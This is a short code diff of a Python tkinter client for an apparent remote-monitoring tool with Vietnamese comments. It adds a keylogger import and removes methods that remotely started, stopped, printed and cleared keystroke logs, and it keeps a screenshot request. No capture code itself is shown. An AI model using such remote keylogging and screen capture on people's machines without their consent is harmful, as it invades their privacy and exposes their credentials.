@@ -2,7 +2,7 @@ import socket
 import tkinter as tk
 from PIL import Image
 from io import BytesIO
-
+from keylogger import Keylogger
 class Client:
     def __init__(self):
         self.server_ip = ""
@@ -38,23 +38,7 @@ class Client:
         self.socket.close()
         print("Đã ngắt kết nối với server.")
 
-    def start_keylogger(self):
-        self.send_message("start")
 
-    def stop_keylogger(self):
-        self.send_message("stop")
-
-    def print_keylog(self):
-        self.send_message("print")
-        response = self.socket.recv(1024).decode()  # Đọc dữ liệu từ server
-        print(response)
-        if response:
-            self.keylog_text.delete(1.0, tk.END)  # Xóa bất kỳ dữ liệu cũ nào trong ô text
-            self.keylog_text.insert(tk.END, response)  # Hiển thị dữ liệu keylog trong ô text
-    
-    def clear_keylog(self):
-        self.send_message("clear")
-    
     def request_screenshot(self):
         self.send_message("screenshot")
 
